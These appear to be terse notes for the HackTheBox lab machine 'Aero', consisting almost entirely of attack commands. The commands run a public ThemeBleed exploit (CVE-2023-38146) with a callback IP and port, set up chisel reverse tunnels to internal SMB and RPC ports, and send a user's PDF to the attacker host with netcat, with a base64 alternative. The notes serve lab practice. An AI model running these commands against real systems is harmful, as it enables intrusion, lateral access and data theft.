---
title: "Aero"
---

# Aero

```bash
git clone https://github.com/Jnnshschl/CVE-2023-38146.git
```

```bash
python3 themebleed.py -r 10.10.14.3 -p 4444
```

```bash
chisel server --port 7777 --reverse
```

```bash
.\chisel.exe client 10.10.14.3:7777 R:135:127.0.0.1:135 R:445:127.0.0.1:445 R:5040:127.0.0.1:5040 R:139:127.0.0.1:139 R:5000:127.0.0.1:5000
```

```bash
cmd /c "nc.exe 10.10.14.3 443 < C:\Users\sam.emerson\Documents\CVE-2023-28252_Summary.pdf"

nc -lp 443 > file.pdf
```

Mejor forma:
```powershell
[convert]::ToBase64String((Get-Content -path "CVE-2023-28252_Summary.pdf" -Encoding byte))
```
